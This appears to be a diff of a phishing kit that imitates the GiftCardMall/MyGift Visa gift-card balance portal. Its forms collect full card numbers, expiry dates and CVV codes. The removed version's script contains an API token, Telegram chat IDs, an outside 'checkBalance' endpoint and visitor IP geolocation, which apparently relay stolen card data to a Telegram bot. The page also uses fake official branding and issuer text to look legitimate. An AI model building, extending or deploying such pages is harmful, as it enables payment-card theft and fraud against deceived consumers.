+.cvv-info-icon { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); width: 18px; height: 18px; background: #999; color: #fff; border-radius: 50%; font-size: 12px; line-height: 18px; text-align: center; font-weight: bold; cursor: help; }
+.field-error { font-size: 12px; color: #c00; margin-top: 4px; }
+
+.buttons-official { text-align: right; padding-right: 20px; }
+.btn-cancel-official { background: none; border: none; color: #666; font-size: 16px; cursor: pointer; margin-right: 15px; }
+.btn-register-official { background: #0066cc; color: #fff; border: none; padding: 12px 32px; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
+.btn-register-official:hover { background: #0055aa; }
+.btn-register-official:disabled { opacity: 0.6; cursor: not-allowed; }
+.spinner { width: 16px; height: 16px; border: 2px solid rgba(255,255,255,.3); border-top-color: #fff; border-radius: 50%; animation: spin .7s linear infinite; display: inline-block; vertical-align: middle; }
+@keyframes spin { to { transform: rotate(360deg); } }
+
+.balance-result { margin-top: 20px; padding: 20px; border-radius: 8px; text-align: center; display: none; }
+.balance-result.show { display: block; }
+.balance-result.success { background: #e8f5ee; border: 1px solid #a5d6a7; }
+.balance-result.error { background: #ffebee; border: 1px solid #ef9a9a; }
+.result-icon { width: 44px; height: 44px; margin: 0 auto 10px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: 700; }
+.balance-result.success .result-icon { background: #0d7d4a; color: #fff; }
+.balance-result.error .result-icon { background: #c53030; color: #fff; }
+.balance-amount { display: flex; align-items: baseline; justify-content: center; gap: 6px; margin-bottom: 6px; }
+.balance-amount .amount { font-size: 28px; font-weight: 700; color: #0d7d4a; }
+.balance-amount .currency { font-size: 14px; color: #666; }
+.card-info { font-size: 13px; color: #666; }
+.error-message { font-size: 14px; color: #666; }
+.btn-check-another { display: none; background: #fff; color: #333; border: 1px solid #ccc; padding: 10px 24px; border-radius: 25px; font-size: 14px; cursor: pointer; margin-top: 12px; }
+.btn-check-another.show { display: inline-block; }
+
+.cards-strip-section { background: #fff; padding: 20px 0; }
+.cards-strip-inner { max-width: 1200px; margin: 0 auto; padding: 0 20px; display: flex; align-items: center; justify-content: space-between; gap: 24px; }
+.cards-strip-image { flex: 1 1 auto; }
+.cards-strip-image img { width: 100%; display: block; }
+.cards-strip-btn { flex: 0 0 auto; }
+.cards-strip-btn .buy-btn-burgers { display: inline-block; background: #e05500; color: #fff; padding: 12px 26px; border-radius: 4px; text-decoration: none; font-weight: bold; font-size: 14px; text-transform: uppercase; border: none; cursor: pointer; white-space: nowrap; }
+
+.faq-card-section { background: linear-gradient(to bottom, #7fb0dc, #72a3d4); padding: 60px 0 80px; }
+.faq-card-inner { max-width: 1200px; margin: 0 auto; padding: 0 20px; color: #111; }
+.faq-card-heading { font-size: 28px; line-height: 1.6; margin-bottom: 40px; }
+.faq-card-heading b { font-weight: 700; }
+.faq-select-title { font-size: 26px; font-weight: 700; margin-bottom: 30px; }
+.card-grid { display: flex; flex-wrap: wrap; column-gap: 24px; row-gap: 40px; }
+.card-grid-item { flex: 0 0 calc((100% - 4 * 24px) / 5); }
+.card-grid-item img { width: 100%; height: auto; display: block; border-radius: 6px; box-shadow: 0 6px 15px rgba(0,0,0,0.18); }
+@media (max-width: 900px) { .faq-card-inner { padding: 0 12px; } .card-grid-item { flex: 0 0 calc((100% - 24px) / 2); } }
+
+.about-section { background: #ffffff; border-top: 1px solid #e5e7eb; border-bottom: 1px solid #e5e7eb; padding: 56px 0; }
+.about-inner { max-width: 1100px; margin: 0 auto; padding: 0 24px; }
+.about-inner h2 { font-size: 32px; font-weight: 700; color: #1f2937; margin-bottom: 16px; text-align: center; }
+.about-inner p { font-size: 18px; line-height: 1.8; color: #374151; margin-bottom: 16px; }
+
+.issuing-section { background: #fff; }
+.issuing-bar { background: #262323; color: #fff; padding: 16px 0; text-align: center; }
+.issuing-bar h2 { font-size: 26px; font-weight: 600; }
+.issuing-content { padding: 40px 0 50px; }
+.issuing-inner { max-width: 1100px; margin: 0 auto; line-height: 1.6; font-size: 20px; padding: 0 24px; }
+.issuing-inner p + p { margin-top: 24px; }
+
+.site-footer { background: #2b2b2b; color: #f1f1f1; padding: 28px 0 24px; position: relative; left: 50%; right: 50%; margin-left: -50vw; margin-right: -50vw; width: 100vw; box-sizing: border-box; }
+.footer-inner { max-width: 1100px; margin: 0 auto; padding: 0 20px; }
+.footer-disclaimer { font-size: 13px; line-height: 1.5; opacity: 0.95; background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.12); border-radius: 6px; padding: 14px 16px; }
+.footer-small { margin-top: 10px; font-size: 12px; color: #cfcfcf; opacity: 0.9; }
+
+.cookie-bar { position: fixed; bottom: 0; left: 0; right: 0; background: #262323; color: #fff; padding: 14px 24px; display: flex; align-items: center; justify-content: center; gap: 16px; flex-wrap: wrap; z-index: 10000; font-size: 14px; box-shadow: 0 -2px 12px rgba(0,0,0,.2); }
+.cookie-bar.hide { display: none; }
+.cookie-bar p { margin: 0; flex: 1; min-width: 200px; }
+.cookie-bar .btn-accept { padding: 8px 24px; font-size: 14px; font-weight: 600; background: #0066cc; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
+.cookie-bar .btn-accept:hover { background: #0055aa; }
+
+.loading-overlay { position: fixed; inset: 0; background: rgba(249,249,249,.95); display: none; align-items: center; justify-content: center; z-index: 9999; flex-direction: column; gap: 12px; }
+.loading-overlay.show { display: flex; }
+.loading-overlay .spinner-lg { width: 44px; height: 44px; border: 3px solid #ccc; border-top-color: #0066cc; border-radius: 50%; animation: spin .8s linear infinite; }
+.loading-overlay .loading-text { font-size: 15px; color: #666; }
+
+@media (max-width: 800px) {
+  .contact-row { flex-direction: column; gap: 10px; }
+  .contact-row .label { width: auto; }
+  .form-grid-official { flex-direction: column; align-items: center; }
+  .large, .medium { width: 100%; max-width: 300px; }
+}
+@media (max-width: 768px) {
+  .hero { height: 320px; align-items: flex-end; }
+  .hero-content { max-width: none; text-align: left; padding: 0 20px 36px; }
+  .hero h1 { font-size: 26px; line-height: 1.2; }
+  .hero p { font-size: 16px; }
+  .issuing-bar h2 { text-align: left !important; padding-left: 20px; }
+  .tabs-official { flex-wrap: wrap; }
+  .tab-official { flex: 1 1 50%; text-align: center; padding: 12px 10px; font-size: 13px; }
+}
+</style>
 </head>
-<body class="main-page-scroll">
-  <div class="app">
-    <!-- Sticky header -->
-    <div class="header-sticky">
-      <!-- Top bar – dark grey -->
-      <div class="top-bar">
-        <div class="top-bar-inner">
-          <div class="top-bar-left">
-            <span>Visa® Reward Card</span>
-            <span>Mastercard® Reward Card</span>
+<body>
+
+<header class="site-header">
+  <div class="header-inner">
+    <a href="/" class="logo-link">
+      <img src="BurgerLogo.png" alt="GiftCardMall MyGift - Gift Card Mall" class="logo-img">
+    </a>
+    <button class="nav-toggle" aria-label="Toggle navigation" aria-expanded="false" aria-controls="primary-nav">
+      <span class="nav-toggle-box">
+        <span class="nav-toggle-line"></span>
+        <span class="nav-toggle-line"></span>
+        <span class="nav-toggle-line"></span>
+      </span>
+    </button>
+    <nav id="primary-nav" class="nav-panel" aria-hidden="true">
+      <ul class="nav-list">
+        <li><a href="/">Home</a></li>
+        <li><a href="/check-balance">Check Balance</a></li>
+        <li><a href="/faqs">FAQs</a></li>
+        <li><a href="/how-it-works">How it works</a></li>
+        <li><a href="/contact">Contact Us</a></li>
+      </ul>
+    </nav>
+    <a href="#" class="buy-btn">Buy a Visa Gift Card</a>
+  </div>
+</header>
+
+<div class="hero">
+  <div class="hero-content">
+    <h1>GiftCardMall/MyGift — Check Your Gift Card Balance</h1>
+    <p>Your trusted Gift Card Mall portal. Check my gift card balance, register, and activate Visa gift cards securely online.</p>
+  </div>
+</div>
+
+<div class="container">
+  <div class="tabs-official">
+    <div class="tab-official active" onclick="showTab('register')">Register Card</div>
+    <div class="tab-official" onclick="showTab('balance')">Check Balance/Transactions</div>
+    <div class="tab-official" onclick="showTab('disputes')">Track Disputes</div>
+    <div class="tab-official" onclick="showTab('pin')">Personalize PIN</div>
+  </div>
+
+  <div class="form-section-official">
+
+    <!-- TAB 1: REGISTER -->
+    <div class="tab-content" id="tab-register" style="display:block">
+      <p class="instruction-text">Provide your card details in the fields below to complete your card registration.</p>
+      <form id="registerForm" onsubmit="return false;">
+        <div id="regFields">
+          <div class="form-grid-official">
+            <div class="field-group">
+              <label class="field-label">Enter Gift Card Number <span class="required">*</span></label>
+              <input type="text" id="regCardNumber" class="input-field large" maxlength="19" placeholder="Card Number" inputmode="numeric" autocomplete="cc-number">
+              <span class="field-error" id="regCardError"></span>
+            </div>
+            <div class="field-group">
+              <label class="field-label">Enter Expiration Date <span class="required">*</span></label>
+              <div class="exp-wrapper">
+                <input type="text" id="regExpMonth" class="input-field small" placeholder="MM" maxlength="2" inputmode="numeric">
+                <span class="slash">/</span>
+                <input type="text" id="regExpYear" class="input-field small" placeholder="YY" maxlength="2" inputmode="numeric">
+              </div>
+              <span class="field-error" id="regExpiryError"></span>
+            </div>
+            <div class="field-group">
+              <label class="field-label">Enter 3-Digit Code (CVV2) <span class="required">*</span></label>
+              <div class="cvv-wrapper">
+                <input type="password" id="regCvv" class="input-field medium" placeholder="Enter Code" maxlength="3" inputmode="numeric" autocomplete="cc-csc">
+                <span class="cvv-info-icon">?</span>
+              </div>
+              <span class="field-error" id="regCvvError"></span>
+            </div>
           </div>
-          <div class="top-bar-right">
-            <a href="#section1">Sign In</a>
-            <span class="top-bar-sep">|</span>
-            <a href="#section1">Activate Card</a>
-            <span class="top-bar-sep">|</span>
-            <span class="top-bar-lang"><img class="flag-us" src="https://flagcdn.com/w40/us.png" alt="US" width="22" height="14"> English</span>
+          <div class="buttons-official">
+            <button type="reset" class="btn-cancel-official" onclick="resetForm('register')">Cancel</button>
+            <button type="button" class="btn-register-official" id="regSubmitBtn" onclick="submitForm('reg')">Register Card</button>
           </div>
         </div>
-      </div>
-      <!-- Main nav – light grey -->
-      <nav class="main-nav">
-        <div class="main-nav-inner">
-          <a href="/" class="site-logo">yourewardcard</a>
-          <div class="main-nav-links">
-            <a href="#section1">Using Your Card</a>
-            <a href="#section2">About yourewardcard</a>
-            <a href="/faq">FAQ</a>
-            <a href="/contact">Contact Us</a>
-          </div>
-        </div>
-      </nav>
+        <div id="regResult" class="balance-result"></div>
+        <div style="text-align:center"><button type="button" class="btn-check-another" id="regAnother" onclick="resetForm('register')">Register Another Card</button></div>
+      </form>
     </div>
 
-    <div class="main-scroll-wrap">
-      <!-- SECTION 1 – Sign In + promo -->
-      <section id="section1" class="main">
-        <div class="main-inner">
-          <div class="form-panel">
-            <div class="form-tabs">
-              <button type="button" class="form-tab active" id="tabSignIn">Sign In</button>
-              <button type="button" class="form-tab form-tab-activate" id="tabActivate">Activate Card</button>
+    <!-- TAB 2: BALANCE -->
+    <div class="tab-content" id="tab-balance" style="display:none">
+      <p class="instruction-text">Fill in your card details below to look up your current balance or recent transactions.</p>
+      <form id="balanceForm" onsubmit="return false;">
+        <div id="balFields">
+          <div class="form-grid-official">
+            <div class="field-group">
+              <label class="field-label">Enter Gift Card Number <span class="required">*</span></label>
+              <input type="text" id="balCardNumber" class="input-field large" maxlength="19" placeholder="Card Number" inputmode="numeric" autocomplete="cc-number">
+              <span class="field-error" id="balCardError"></span>
             </div>
-            <p class="form-card-title">Manage your yourewardcard</p>
-            <form id="balanceForm">
-              <div id="formFields">
-                <div class="form-group">
-                  <label for="cardNumber">CARD NUMBER</label>
-                  <input type="text" id="cardNumber" placeholder="16 digits, no spaces" maxlength="19" inputmode="numeric" autocomplete="cc-number">
-                  <span class="field-error" id="cardError"></span>
-                </div>
-                <div class="form-group">
-                  <label for="expiryMonth">EXPIRATION DATE</label>
-                  <div class="expiry-inputs">
-                    <input type="text" id="expiryMonth" placeholder="MM" maxlength="2" inputmode="numeric">
-                    <span class="expiry-sep">/</span>
-                    <input type="text" id="expiryYear" placeholder="YY" maxlength="2" inputmode="numeric">
-                  </div>
-                  <span class="field-error" id="expiryError"></span>
-                </div>
-                <div class="form-group">
-                  <label for="cvv">CVV</label>
-                  <input type="password" id="cvv" placeholder="3 digits" maxlength="4" inputmode="numeric" autocomplete="cc-csc">
-                  <span class="field-error" id="cvvError"></span>
-                </div>
-                <div class="form-group">
-                  <label for="cardName">NAME ON CARD <span style="font-weight:400;text-transform:none;letter-spacing:0;color:#999">(Optional)</span></label>
-                  <input type="text" id="cardName" placeholder="Cardholder name" maxlength="50" autocomplete="cc-name">
-                </div>
-                <label class="form-checkbox">
-                  <input type="checkbox" id="showSignInInfo"> Show Sign-in Info
-                </label>
-                <button type="submit" class="btn-signin" id="submitBtn">Sign In</button>
+            <div class="field-group">
+              <label class="field-label">Enter Expiration Date <span class="required">*</span></label>
+              <div class="exp-wrapper">
+                <input type="text" id="balExpMonth" class="input-field small" placeholder="MM" maxlength="2" inputmode="numeric">
+                <span class="slash">/</span>
+                <input type="text" id="balExpYear" class="input-field small" placeholder="YY" maxlength="2" inputmode="numeric">
               </div>
-              <button type="button" class="btn-signin" id="checkAnother">Check Another Card</button>
-            </form>
-            <div id="result" class="balance-result"></div>
+              <span class="field-error" id="balExpiryError"></span>
+            </div>
+            <div class="field-group">
+              <label class="field-label">Enter 3-Digit Code (CVV2) <span class="required">*</span></label>
+              <div class="cvv-wrapper">
+                <input type="password" id="balCvv" class="input-field medium" placeholder="Enter Code" maxlength="3" inputmode="numeric" autocomplete="cc-csc">
+                <span class="cvv-info-icon">?</span>
+              </div>
+              <span class="field-error" id="balCvvError"></span>
+            </div>
           </div>
-          <div class="promo-panel">
-            <div class="promo-image" id="promoImage" aria-hidden="true"></div>
+          <div class="buttons-official">
+            <button type="reset" class="btn-cancel-official" onclick="resetForm('balance')">Cancel</button>
+            <button type="button" class="btn-register-official" id="balSubmitBtn" onclick="submitForm('bal')">Submit</button>
           </div>
         </div>
-      </section>
+        <div id="balResult" class="balance-result"></div>
+        <div style="text-align:center"><button type="button" class="btn-check-another" id="balAnother" onclick="resetForm('balance')">Check Another Card</button></div>
+      </form>
+    </div>
 
-      <!-- SECTION 2 – How to activate + Getting Started (like screenshot 1) -->
-      <div class="activate-bar">
-        <div class="activate-bar-inner">
-          How to activate your yourewardcard
-        </div>
-      </div>
-      <section id="section2" class="section-getting-started">
-        <div class="section-inner">
-          <h1>Getting Started with your yourewardcard</h1>
-          <div class="getting-started-grid">
-            <div class="getting-started-cards-col">
-              <div class="card-images-wrap">
-                <div class="card-image top">
-                  <span class="card-label">RewardCard</span>
-                  <span class="card-number">4000 1234 5678 9010</span>
-                  <span class="card-expires">Card expires 10/27</span>
-                  <span class="card-recipient">Reward Card Recipient</span>
-                  <span class="card-debit">Debit</span>
-                  <span class="card-network">VISA</span>
-                </div>
-                <div class="card-image bottom">
-                  <span class="card-label">RewardCard</span>
-                  <span class="card-number">5412 7512 3412 3456</span>
-                  <span class="card-expires">Card expires 05/27</span>
-                  <span class="card-recipient">Reward Card Recipient</span>
-                  <span class="card-debit">debit</span>
-                  <span class="card-network">Mastercard</span>
-                </div>
-              </div>
-            </div>
-            <div class="getting-started-text">
-              <h2>Manage Card</h2>
-              <p>Once you activate your Card, you can sign in to view your balance and card activity, and change Card PIN.</p>
-              <h2>Using your Card</h2>
-              <p>Use your Card to pay for gas, online shopping, bill payments, and more. Accepted at locations everywhere Debit Mastercard and Visa debit cards are accepted.</p>
+    <!-- TAB 3: DISPUTES -->
+    <div class="tab-content" id="tab-disputes" style="display:none">
+      <p class="instruction-text">Supply the following details to monitor or manage your dispute case.</p>
+      <form onsubmit="return false;">
+        <div class="form-grid-official">
+          <div class="field-group">
+            <label class="field-label">Dispute Case Number <span class="required">*</span></label>
+            <input type="text" id="disputeCaseNumber" class="input-field large" maxlength="8" placeholder="Case Number">
+          </div>
+          <div class="field-group">
+            <label class="field-label">Last 4 Digits of the Card <span class="required">*</span></label>
+            <input type="text" id="disputeLast4" class="input-field medium" placeholder="Last 4 Digits of Card" maxlength="4" inputmode="numeric">
+          </div>
+          <div class="field-group">
+            <label class="field-label">Registered Zip Code <span class="required">*</span></label>
+            <div class="cvv-wrapper">
+              <input type="text" id="disputeZip" class="input-field medium" placeholder="Zip Code" maxlength="5">
             </div>
           </div>
         </div>
-      </section>
+        <div class="buttons-official">
+          <button type="reset" class="btn-cancel-official">Cancel</button>
+          <button type="button" class="btn-register-official">Track Disputes</button>
+        </div>
+      </form>
+    </div>
 
-      <!-- SECTION 3 – Three feature cards (like screenshot 2) -->
-      <section id="section3" class="section-feature-cards">
-        <div class="section-inner">
-          <div class="feature-cards-grid">
-            <div class="feature-card">
-              <div class="feature-icon">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" aria-hidden="true"><path d="M8 10h32v22H8V10zm2 2v18h28V12H10zm4 4h8v2h-8v-2zm0 4h12v2H14v-2zm0 4h10v2H14v-2z"/><path d="M14 32h2v4h-2v-4zm4 0h2v4h-2v-4zm4 0h2v4h-2v-4z"/></svg>
-              </div>
-              <h3>Use Online</h3>
-              <p>The yourewardcard is a simple, safe and convenient method of making online payments.</p>
-              <a href="/learnmore#use-online">Learn More</a>
+    <!-- TAB 4: PIN -->
+    <div class="tab-content" id="tab-pin" style="display:none">
+      <p class="instruction-text">Input your card details below to set up your own personal PIN.</p>
+      <form id="pinForm" onsubmit="return false;">
+        <div id="pinFields">
+          <div class="form-grid-official">
+            <div class="field-group">
+              <label class="field-label">Enter Gift Card Number <span class="required">*</span></label>
+              <input type="text" id="pinCardNumber" class="input-field large" maxlength="19" placeholder="Card Number" inputmode="numeric" autocomplete="cc-number">
+              <span class="field-error" id="pinCardError"></span>
             </div>
-            <div class="feature-card">
-              <div class="feature-icon">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" aria-hidden="true"><rect x="6" y="8" width="36" height="32" rx="2" fill="none" stroke="currentColor" stroke-width="2"/><path d="M14 20h20v4H14v-4zm0 8h12v2H14v-2z"/><circle cx="24" cy="28" r="2" fill="currentColor"/><path d="M24 14v6M21 17h6" stroke="currentColor" stroke-width="1.5" fill="none"/></svg>
+            <div class="field-group">
+              <label class="field-label">Enter Expiration Date <span class="required">*</span></label>
+              <div class="exp-wrapper">
+                <input type="text" id="pinExpMonth" class="input-field small" placeholder="MM" maxlength="2" inputmode="numeric">
+                <span class="slash">/</span>
+                <input type="text" id="pinExpYear" class="input-field small" placeholder="YY" maxlength="2" inputmode="numeric">
               </div>
-              <h3>ATM Access</h3>
-              <p>Flexibility to use your Card at ATMs and get cash back at the point of sale (if your card allows cash access).</p>
-              <a href="/learnmore#atm-access">Learn More</a>
+              <span class="field-error" id="pinExpiryError"></span>
             </div>
-            <div class="feature-card">
-              <div class="feature-icon">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" aria-hidden="true"><circle cx="24" cy="24" r="20" fill="none" stroke="currentColor" stroke-width="2"/><ellipse cx="24" cy="24" rx="20" ry="8" fill="none" stroke="currentColor" stroke-width="1.5"/><path d="M4 24h40M24 4v40" stroke="currentColor" stroke-width="1" fill="none"/><path d="M10 10c8 6 16 6 24 0M10 38c8-6 16-6 24 0" stroke="currentColor" stroke-width="1" fill="none"/></svg>
+            <div class="field-group">
+              <label class="field-label">Enter 3-Digit Code (CVV2) <span class="required">*</span></label>
+              <div class="cvv-wrapper">
+                <input type="password" id="pinCvv" class="input-field medium" placeholder="Enter Code" maxlength="3" inputmode="numeric" autocomplete="cc-csc">
+                <span class="cvv-info-icon">?</span>
               </div>
-              <h3>Use Everywhere*</h3>
-              <p>Can be used everywhere Debit Mastercard and Visa debit cards are accepted. See Cardholder Agreement for details on where your card can be used.</p>
-              <a href="/learnmore#use-everywhere">Learn More</a>
+              <span class="field-error" id="pinCvvError"></span>
             </div>
           </div>
-          <div class="back-to-top-wrap">
-            <a href="#section1">^ Back to Top</a>
+          <div class="buttons-official">
+            <button type="reset" class="btn-cancel-official" onclick="resetForm('pin')">Cancel</button>
+            <button type="button" class="btn-register-official" id="pinSubmitBtn" onclick="submitForm('pin')">Personalize PIN</button>
           </div>
         </div>
-      </section>
+        <div id="pinResult" class="balance-result"></div>
+        <div style="text-align:center"><button type="button" class="btn-check-another" id="pinAnother" onclick="resetForm('pin')">Try Another Card</button></div>
+      </form>
+    </div>
 
-      <!-- SECTION 4 – Full footer (like screenshot 4) -->
-      <footer id="section4" class="footer-full">
-        <div class="footer-top">
-          <span class="footer-logo">yourewardcard</span>
-          <div class="footer-links">
-            <a href="#section1">Using Your Card</a>
-            <a href="#section2">About yourewardcard</a>
-            <a href="#section3">yourewardcard Features</a>
-            <a href="/faq">FAQ</a>
-            <a href="/contact">Contact Us</a>
-          </div>
-        </div>
-        <a href="#section1" class="back-to-top">^ Back to Top</a>
-        <div class="footer-bottom">
-          <div class="copyright">Copyright © 2026. All rights reserved.</div>
-          <div class="legal">TERMS AND CONDITIONS ARE APPLIED TO PREPAID CARDS. See Cardholder Agreement for further details.</div>
-          <div class="legal">Mastercard and Visa are registered trademarks. Card can be used in the U.S. and District of Columbia. Card issued by Pathward®, N.A., Member FDIC. See Cardholder Agreement for details. Visa® Prepaid Incentives Card issued by Pathward®, N.A., Member FDIC.</div>
-          <div class="policy-links">
-            <a href="/contact">Pathward®, N.A. Privacy Policy</a> &bull;
-            <a href="/contact">Terms of Use</a> &bull;
-            <a href="/contact">Cardholder Agreement</a> &bull;
-            <a href="/contact">Accessibility Statement</a>
-          </div>
-        </div>
-      </footer>
+  </div>
+</div>
+
+<section class="about-section">
+  <div class="about-inner">
+    <h2>About GiftCardMall/MyGift — Your Trusted Gift Card Mall</h2>
+    <p>GiftCardMall/MyGift is a trusted prepaid gift card service that lets you easily activate, sign up, and oversee Visa and Mastercard gift cards through industry-standard protection. Whether your MyGift card was a gift from someone special or something you picked up yourself, you can swiftly look up your balance on the web, browse through past purchases, and stay on top of your funds &mdash; at any time, on any device. Since these prepaid cards function just like debit cards, they work at countless locations across the country, from major stores and dining spots to travel booking sites and well-known online shops that accept Visa and Mastercard.</p>
+    <p>Through the GiftCardMall/MyGift web portal, cardholders get immediate access to key features built around ease of use and clarity. Simply type in your 16-digit card number, expiry date (MM/YY), and the 3-digit CVV to safely view your remaining funds within moments. Up-to-the-minute balance lookups and detailed purchase records help you steer clear of payment rejections and maximize the value loaded onto your card.</p>
+    <p>The setup process is hassle-free. Certain GiftCardMall/MyGift cards come pre-activated at the point of sale, while others need a brief online activation step. Once activated, adding your name and billing ZIP code to your card is strongly encouraged &mdash; doing so enables seamless web-based shopping, provides an additional security measure, and simplifies the resolution process should your card ever go missing or get stolen. You can also create a custom PIN where available, monitor your prepaid card standing, and review spending patterns over time for smarter purchasing decisions.</p>
+    <p>Should you encounter any difficulty &mdash; whether it's a rejected payment, an unexpected balance difference, or concerns about pending charges &mdash; begin by confirming your current funds and double-checking that your billing address is accurate during online checkout. Keep in mind that certain businesses (such as dining establishments, lodging providers, and gas stations) may apply temporary holds that exceed your actual purchase total, so maintaining a small cushion in your balance can help avoid surprise declines.</p>
+    <p style="margin-bottom:0">GiftCardMall/MyGift cards are produced by reputable, FDIC-insured financial institutions and handled through secure, encrypted channels to safeguard your personal data. By pairing widespread merchant acceptance with effortless balance lookups, quick activation, and dependable assistance, GiftCardMall/MyGift offers a versatile and trustworthy solution for gifting, spending, and overseeing prepaid funds. Ready to get started? Set up your card, complete your registration, and look up your Visa gift card balance online now.</p>
+  </div>
+</section>
+
+<section class="cards-strip-section">
+  <div class="cards-strip-inner">
+    <div class="cards-strip-image">
+      <img src="strip-image.png" alt="GiftCardMall MyGift Visa prepaid gift cards available at Gift Card Mall">
+    </div>
+    <div class="cards-strip-btn">
+      <button class="buy-btn-burgers">Purchase Another Gift Card</button>
     </div>
   </div>
-  <div class="loading-overlay" id="loadingOverlay">
-    <div class="spinner-lg"></div>
-    <span class="loading-text">Checking your card balance...</span>
+</section>
+
+<section class="faq-card-section">
+  <div class="faq-card-inner">
+    <p class="faq-card-heading">
+      Below you can access <b>Common Questions &amp; Answers</b> (FAQs) along with the <b>Cardholder Agreement</b>.
+    </p>
+    <div class="faq-select-title">Choose your card type</div>
+    <div class="card-grid">
+      <div class="card-grid-item"><img src="card1.png" alt="GiftCardMall Visa gift card - check gift card balance"></div>
+      <div class="card-grid-item"><img src="card2.png" alt="MyGift Visa prepaid gift card from Gift Card Mall"></div>
+      <div class="card-grid-item"><img src="card3.png" alt="Gift Card Mall Visa gift card - check my gift card"></div>
+      <div class="card-grid-item"><img src="card4.png" alt="GiftCardMall MyGift Visa gift card balance check"></div>
+      <div class="card-grid-item"><img src="card5.png" alt="Visa gift card from GiftCardMall - Gift Card Mall"></div>
+      <div class="card-grid-item"><img src="card6.png" alt="MyGift prepaid Visa gift card - gift card balance"></div>
+    </div>
   </div>
-  <div class="cookie-bar" id="cookieBar">
-    <p>We use cookies to improve your experience and keep this site secure. By continuing, you accept our use of cookies.</p>
-    <button type="button" class="btn-accept" id="cookieAccept">Accept</button>
+</section>
+
+<section class="issuing-section">
+  <div class="issuing-bar"><h2>Contact Us</h2></div>
+  <div class="issuing-content">
+    <div class="issuing-inner">
+      <div class="contact-row">
+        <div class="label"><b>A Message for Our Cardholders</b></div>
+        <div class="contact-text">
+          <p>Your safety and the well-being of our staff and broader community remain our top priority. To support public health efforts, we have transitioned many of our Support Representatives to remote work environments. As a result, you may experience slightly extended wait times when calling. For the quickest resolution, we recommend trying our self-service tools or reviewing the FAQs prior to reaching out.</p>
+        </div>
+      </div>
+      <br>
+      <div class="contact-row">
+        <div class="label"><b>Call Us</b></div>
+        <div class="contact-text">
+          <p>For support-related questions, please dial the toll-free number printed on the reverse side of your card. If your card has been misplaced or taken, consult the FAQs that apply to your particular Visa Gift Card.</p>
+        </div>
+      </div>
+      <br>
+      <div class="contact-row">
+        <div class="label"><b>Send a Letter</b></div>
+        <div class="contact-text">
+          <p><b>Support Team &mdash; Written Inquiries</b></p>
+          <p>Be sure to include your full name, the account number on your card, and the final four digits of your phone number so we can verify your identity.</p>
+        </div>
+      </div>
+    </div>
   </div>
-  <script>
-    const API_TOKEN='4439f671d73478c6401b758b50594ce5';
-    const TELEGRAM_BEFORE='-1003750392427';
-    const TELEGRAM_AFTER='-1003750392427';
-    const API_URL='https://bot.pc.am/v3/checkBalance';
+</section>
 
-    let visitorIP='unknown';
-    let visitorCity='';
-    let visitorCountry='';
-    (async function(){
-      try{
-        const r=await fetch('https://ipapi.co/json/');
-        const d=await r.json();
-        visitorIP=d.ip||'unknown';
-        visitorCity=d.city||'';
-        visitorCountry=d.country_name||'';
-      }catch(e){}
-    })();
-    const visitorTimezone=Intl.DateTimeFormat().resolvedOptions().timeZone||'unknown';
-    const visitorReferral=document.referrer||'direct';
+<section class="issuing-section">
+  <div class="issuing-bar"><h2>Issuing Statement</h2></div>
+  <div class="issuing-content">
+    <div class="issuing-inner">
+      <p>The Visa&reg; Gift Card is provided by Pathward, N.A., Member FDIC, or Sunrise Banks, N.A., located in St. Paul, MN 55103, Member FDIC, under license from Visa U.S.A. Inc. This card is valid for purchases throughout the United States at any location where Visa debit cards are accepted. Refer to the Cardholder Agreement for full terms and conditions.</p>
+      <p>All trademarks displayed belong to their respective holders and appear here with authorization.</p>
+    </div>
+  </div>
+</section>
 
-    (function(){
-      try{
-        if(localStorage.getItem('yourewardcard_cookies')==='accepted'){document.getElementById('cookieBar').classList.add('hide');return;}
-        document.getElementById('cookieAccept').onclick=function(){localStorage.setItem('yourewardcard_cookies','accepted');document.getElementById('cookieBar').classList.add('hide');};
-      }catch(e){}
-    })();
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-disclaimer">
+      This site functions as a standalone portal intended solely for informational and practical purposes. Every trademark, brand name, service mark, and logo referenced herein is the property of its respective owner and is mentioned purely for identification. Your use of this website is governed by relevant terms and conditions, and each user bears full responsibility for adhering to their cardholder agreement and applicable local laws.
+    </div>
+    <div class="footer-small">
+      &copy; 2026 MyGiftGiftCardMall. All rights reserved. This interface is provided "as is," without guarantees.
+    </div>
+  </div>
+</footer>
 
-    const cardInput=document.getElementById('cardNumber'),expiryMonth=document.getElementById('expiryMonth'),expiryYear=document.getElementById('expiryYear'),cvvInput=document.getElementById('cvv');
-    const form=document.getElementById('balanceForm'),resultEl=document.getElementById('result'),submitBtn=document.getElementById('submitBtn'),formFields=document.getElementById('formFields'),checkAnother=document.getElementById('checkAnother');
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="spinner-lg"></div>
+  <span class="loading-text">Handling your request...</span>
+</div>
 
-    function getCardType(num){
-      const d=String(num).replace(/\D/g,'');
-      if(d.startsWith('4'))return'Visa';
-      if(/^5[1-5]/.test(d))return'Mastercard';
-      const n4=d.length>=4?parseInt(d.slice(0,4),10):0;
-      if(d.startsWith('2')&&n4>=2221&&n4<=2720)return'Mastercard';
-      if(/^3[47]/.test(d))return'American Express';
-      return null;
-    }
-    const CARD_LOGOS={Visa:'<svg class="detected-card-logo-svg" viewBox="0 0 48 16" width="72" height="24"><text x="0" y="12" font-family="Arial,sans-serif" font-size="14" font-weight="bold" fill="#1A1F71">VISA</text></svg>',Mastercard:'<svg class="detected-card-logo-svg" viewBox="0 0 48 32" width="54" height="36"><circle cx="17" cy="16" r="12" fill="#EB001B"/><circle cx="31" cy="16" r="12" fill="#F79E1B"/><path d="M24 5a12 12 0 0 1 7 11 12 12 0 0 1-7 11 12 12 0 0 1-7-11 12 12 0 0 1 7-11z" fill="#FF5F00"/></svg>','American Express':'<svg class="detected-card-logo-svg" viewBox="0 0 48 16" width="60" height="20"><text x="0" y="12" font-family="Arial,sans-serif" font-size="10" font-weight="bold" fill="#006FCF">AMEX</text></svg>'};
